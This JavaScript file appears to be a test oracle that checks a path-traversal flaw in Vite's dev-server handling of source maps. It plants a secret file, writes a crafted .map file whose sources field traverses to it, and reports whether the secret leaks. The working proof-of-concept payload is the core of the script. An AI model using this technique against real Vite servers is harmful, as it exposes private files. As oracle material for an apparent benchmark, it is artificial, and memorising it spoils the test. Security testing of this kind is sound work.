const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'root');
  const cacheDir = path.join(root, 'node_modules', '.vite', 'deps');

  try {
    fs.mkdirSync(cacheDir, { recursive: true });

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer is unavailable');
    }

    const benignMap = path.join(cacheDir, 'safe.js.map');
    fs.writeFileSync(benignMap, JSON.stringify({ version: 3, file: 'safe.js', sources: ['safe.ts'], names: [], mappings: '' }));

    const secretPath = path.join(base, 'secret.txt');
    fs.writeFileSync(secretPath, 'TOP_SECRET_' + marker);

    const relativeTraversal = path.relative(cacheDir, secretPath).split(path.sep).join('/');
    const maliciousMap = path.join(cacheDir, 'evil.js.map');
    fs.writeFileSync(maliciousMap, JSON.stringify({ version: 3, file: 'evil.js', sources: [relativeTraversal], names: [], mappings: '' }));

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true },
      appType: 'custom'
    });

    const handleRequest = (url) => new Promise((resolve) => {
      const req = { method: 'GET', url, headers: {} };
      const res = {
        statusCode: 200,
        headers: {},
        body: '',
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        end(chunk) { if (chunk) this.body += chunk; resolve({ statusCode: this.statusCode, headers: this.headers, body: this.body }); },
        write(chunk) { if (chunk) this.body += chunk; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
          }
          return this;
        }
      };

      server.middlewares.handle(req, res, () => {
        if (!res.body) res.body = '';
        resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body });
      });
    });

    let benignResp;
    try {
      benignResp = await handleRequest('/node_modules/.vite/deps/safe.js.map');
    } catch (e) {
      await server.close();
      throw e;
    }

    if (!benignResp || benignResp.statusCode >= 500 || !String(benignResp.body || '').includes('safe.ts')) {
      await server.close();
      throw new Error('benign optimized-deps .map request did not succeed');
    }

    operation_completed = true;

    let malResp;
    let malErr = null;
    try {
      malResp = await handleRequest('/node_modules/.vite/deps/evil.js.map');
    } catch (e) {
      malErr = e;
    }

    await server.close();

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious request threw: ' + String(malErr && malErr.message ? malErr.message : malErr);
    } else {
      const body = String((malResp && malResp.body) || '');
      const leaked = body.includes(relativeTraversal) || body.includes(path.basename(secretPath)) || body.includes('TOP_SECRET_');
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benignResp.statusCode + ', malicious_status=' + (malResp ? malResp.statusCode : 'none') + ', leaked=' + leaked;
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + String(err && err.message ? err.message : err);
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
